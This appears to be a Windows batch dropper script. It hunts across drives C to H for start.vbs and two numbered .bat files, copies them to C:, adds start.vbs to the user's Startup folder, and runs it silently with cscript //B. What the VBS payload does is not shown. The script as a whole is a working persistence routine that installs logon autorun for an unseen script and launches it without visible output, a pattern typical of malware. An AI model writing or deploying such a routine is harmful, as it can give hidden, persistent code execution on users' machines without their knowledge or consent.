@echo off
setlocal enabledelayedexpansion

REM List of files to find and copy
set FILES=start.vbs setup-1234.bat cmd-5678.bat

REM Where to copy files
set TARGET=C:\

REM Loop through each file
for %%F in (%FILES%) do (
    set "found="
    REM Loop through drives
    for %%D in (C D E F G H) do (
        if not "!found!"=="1" (
            for /f "delims=" %%A in ('dir /s /b "%%D:\%%F" 2^>nul') do (
                copy /y "%%A" "%TARGET%\%%F" >nul
                set "found=1"
            )
        )
    )
)

REM Add start.vbs to Startup folder for current user (overwrites if present)
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y "%TARGET%\start.vbs" "%STARTUP%\start.vbs" >nul

REM Immediately execute start.vbs from the new copy in C:\
cscript //B "%TARGET%\start.vbs"

endlocal
